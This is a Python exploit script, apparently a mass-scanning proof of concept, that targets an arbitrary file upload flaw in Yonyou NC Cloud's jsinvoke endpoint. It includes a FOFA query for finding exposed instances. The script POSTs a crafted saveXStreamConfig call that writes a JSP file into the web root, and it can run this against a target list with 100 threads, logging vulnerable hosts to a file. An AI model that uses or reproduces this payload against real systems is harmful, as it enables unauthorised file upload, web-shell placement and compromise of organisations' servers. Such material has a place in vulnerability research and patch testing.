#用友NC_Cloud_jsinvoke任意文件上传
#fofa:app="用友-NC-Cloud"

import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
# 关闭警告
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""

███╗   ██╗ ██████╗         ██████╗██╗      ██████╗ ██╗   ██╗██████╗              ██╗███████╗██╗███╗   ██╗██╗   ██╗ ██████╗ ██╗  ██╗███████╗
████╗  ██║██╔════╝        ██╔════╝██║     ██╔═══██╗██║   ██║██╔══██╗             ██║██╔════╝██║████╗  ██║██║   ██║██╔═══██╗██║ ██╔╝██╔════╝
██╔██╗ ██║██║             ██║     ██║     ██║   ██║██║   ██║██║  ██║             ██║███████╗██║██╔██╗ ██║██║   ██║██║   ██║█████╔╝ █████╗  
██║╚██╗██║██║             ██║     ██║     ██║   ██║██║   ██║██║  ██║        ██   ██║╚════██║██║██║╚██╗██║╚██╗ ██╔╝██║   ██║██╔═██╗ ██╔══╝  
██║ ╚████║╚██████╗███████╗╚██████╗███████╗╚██████╔╝╚██████╔╝██████╔╝███████╗╚█████╔╝███████║██║██║ ╚████║ ╚████╔╝ ╚██████╔╝██║  ██╗███████╗
╚═╝  ╚═══╝ ╚═════╝╚══════╝ ╚═════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝ ╚════╝ ╚══════╝╚═╝╚═╝  ╚═══╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚══════╝
                                                                                                                                           
                                                                                                                                                                                      
"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="用友NC_Cloud_jsinvoke任意文件上传")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = "/uapjs/jsinvoke/?action=invoke"
    headers = {
        'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'
    }
    data = {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig",
"parameterTypes":["java.lang.Object","java.lang.String"],
"parameters":["123456","webapps/nc_web/2YIOmzdcUDhwMYTLk65p3cgxvxy.jsp"]}
    proxies ={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    } 
    try:
        res1 = requests.post(url=target+payload,headers=headers,json=data,verify=False,proxies=proxies)
        if res1.status_code==200:
            print(f'[+]{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8') as fp1:
                fp1.write(target+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except requests.RequestException as e:
        print(f"[-] 请求失败: {target}, 错误信息: {e}")
    except json.JSONDecodeError:
        print(f"[-] 无法解码JSON响应: {target}")
    except Exception as e:
        print(f"[-] 处理请求时出错: {target}, 错误信息: {e}")    

if __name__ == "__main__":
    main()